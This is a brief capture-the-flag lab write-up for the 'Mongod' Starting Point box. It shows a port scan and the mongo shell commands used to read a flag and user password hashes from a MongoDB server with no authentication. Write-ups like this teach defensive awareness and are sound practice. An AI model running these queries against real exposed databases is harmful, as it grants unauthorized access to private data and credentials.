Mongod is a Very Easy Starting Point Linux box running MongoDB 3.6.8 bound to all interfaces with no authentication. Direct connection to the database exposes a `sensitive_information` collection containing the flag.

## Reconnaissance

### Port Scan

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
27017/tcp open  mongodb MongoDB 3.6.8
```

## Exploitation

### Unauthenticated MongoDB Access

MongoDB 3.6.8 had no authentication configured. Connected using a legacy mongo shell (modern mongosh incompatible with wire protocol v6):

```
show dbs
→ sensitive_information, users, admin, config, local

use sensitive_information
db.flag.find()
```

The `users.ecommerceWebapp` collection also contained 25 user records with SHA-1 and MD5 hashed passwords.

## Key Takeaway

MongoDB binds to localhost by default in newer versions, but older installs (pre-4.0) often bind to 0.0.0.0 with no auth. Always check for exposed database ports.
